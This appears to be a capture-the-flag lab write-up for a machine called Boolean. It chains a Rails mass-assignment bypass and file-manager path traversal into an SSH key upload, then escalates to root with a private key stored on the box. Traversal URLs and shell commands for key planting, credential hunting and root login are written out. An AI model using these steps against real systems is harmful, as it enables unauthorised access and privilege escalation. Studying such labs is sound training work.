title: Boolean Retrospective — File Manager Traversal to Root via Stored SSH Key
body:
Boolean was a mass-assignment registration bypass leading to a file manager with path traversal — two distinct primitives that chain to root via SSH key abuse. The box is deceptively simple but packed with recognition traps: a Rails app that tells you the attack syntax from its own cookies, a file manager that's actually a read/write-anywhere primitive, a root private key sitting unprotected in a user's home dir, and an SSH failure mode that looks like auth broken but is actually a client-side flag issue.

Chain: null-auth register -> mass assignment (confirmed:false -> true) -> file manager login -> path traversal cwd=../../../../home/remi/.ssh/ -> upload authorized_keys -> SSH as remi -> LinPEAS finds /home/remi/.ssh/keys/root (root's private key) -> SSH -i key -o IdentitiesOnly=yes root@localhost -> root.

-- FIVE LESSONS --

  1. RAILS TELLS YOU THE SYNTAX BEFORE YOU TEST ANYTHING
     Two tells in the initial request: (a) Cookie: _boolean_session -> Rails,
     means bracket syntax user[field]=value. (b) authenticity_token in the body
     -> confirms Rails CSRF, confirms mass assignment model. When you see these,
     you know before touching a single input that user[confirmed]=true is valid
     syntax. Read the framework from the response, not the source code.

  2. A FILE MANAGER IS A READ/WRITE-ANYWHERE PRIMITIVE
     The cwd parameter controlled where the file manager operated. That's not
     'just' an LFI — it's a full filesystem write primitive. The attack path:
     read /etc/passwd (confirm traversal works), then WRITE authorized_keys to
     /home/remi/.ssh/ (turn read into code execution). Any file manager with a
     path parameter is a candidate for this. The curl-download URL pattern
     (?cwd=&file=&download=true) is the tell for the Boolean box specifically.

  3. KEYS STORED ON THE BOX ARE GOLD
     LinPEAS flagged /home/remi/.ssh/keys/root — root's own private key left
     in a user-readable directory. This is a common box pattern AND a real-world
     misconfiguration (admins storing backup keys, deployment keys, etc.).
     Always check: ~/.ssh/keys/, ~/.ssh/id_*, /opt/*/.ssh/, /var/backup/*.pem
     Any private key file you can read is a potential lateral/vertical move.

  4. SSH PROMPTING FOR PASSWORD DESPITE A KEY = CLIENT PROBLEM, NOT SERVER
     The key existed, the permissions were right, but SSH went to password prompt
     anyway. Cause: SSH was trying EVERY identity in the agent and hitting the
     server's MaxAuthTries limit before reaching the right key.
     Fix: -o IdentitiesOnly=yes forces SSH to use ONLY -i <key>, nothing else.
     This is the #1 SSH key authentication failure mode. Add it to every ssh
     command when key auth isn't working.

  5. WHEN REMOTE SSH WITH A KEY FAILS, TRY LOCALHOST
     After confirming the key was valid (ssh-keygen -y returned the public key),
     the remote attempt still failed because the Kali SSH client was trying too
     many identities. Using the key locally from remi's shell bypassed that
     entirely: ssh -i /home/remi/.ssh/keys/root -o IdentitiesOnly=yes root@localhost
     If you have a shell on the box and a key on the box, SSH localhost.

-- REUSABLE CHAIN (file-manager web app) --

  1. Register -> capture PATCH/settings -> read response JSON for boolean fields
  2. Add user[confirmed]=true to request body (Rails: authenticity_token = tell)
  3. Login -> find the file manager / path-parameter endpoint
  4. curl ?cwd=../../../../etc/passwd or equivalent to confirm traversal
  5. Generate SSH keypair -> upload authorized_keys to /home/<user>/.ssh/
  6. SSH in -> run LinPEAS -> check ~/.ssh/keys/ for any stored private keys
  7. ssh -i <found_key> -o IdentitiesOnly=yes root@localhost
cmd:
# ── BOOLEAN PATTERN -- file manager -> SSH key upload -> root via stored key --

# 1) MASS ASSIGNMENT (Rails tell: _boolean_session + authenticity_token)
# Intercept PATCH /settings/email -> read JSON response for boolean fields
# Add to body: &user[confirmed]=true -> confirmed:true -> log in

# 2) FILE MANAGER TRAVERSAL (confirm read, then write)
# Read:  http://$ip/?cwd=../../../../etc/&file=passwd&download=true
# Write: upload authorized_keys with cwd=../../../../home/remi/.ssh/
ssh-keygen -q -N '' -f sshkey
mv sshkey.pub authorized_keys
chmod 600 sshkey
# upload authorized_keys via file manager to /home/remi/.ssh/

# 3) SSH AS REMI
ssh -i sshkey -o IdentitiesOnly=yes remi@$ip

# 4) FIND ROOT KEY (LinPEAS finds it, or check manually)
find /home -name 'id_*' -o -name '*.pem' -o -name 'root' 2>/dev/null | grep -i ssh
ls -la /home/remi/.ssh/keys/
cat /home/remi/.ssh/keys/root   # root's private key -- stored unprotected

# 5) SSH AS ROOT -- USE IDENTITIESONLY OR IT FAILS
ssh -i /home/remi/.ssh/keys/root -o IdentitiesOnly=yes root@localhost
# root@boolean:~# whoami -> root
cat /root/proof.txt
warn: Boolean's traps are all recognition failures: (1) if you don't know Rails by its cookie name, you miss that user[confirmed]=true is valid syntax and spend time guessing parameters; (2) if you treat the file manager as read-only you miss the write primitive for SSH key upload; (3) if you find a private key and SSH prompts for password, the fix is -o IdentitiesOnly=yes NOT 'the key is wrong'; (4) if remote SSH with a valid key fails, SSH localhost using the key on the box itself. The root key in /home/remi/.ssh/keys/ is world-readable — always check home directories for stored keys after foothold.
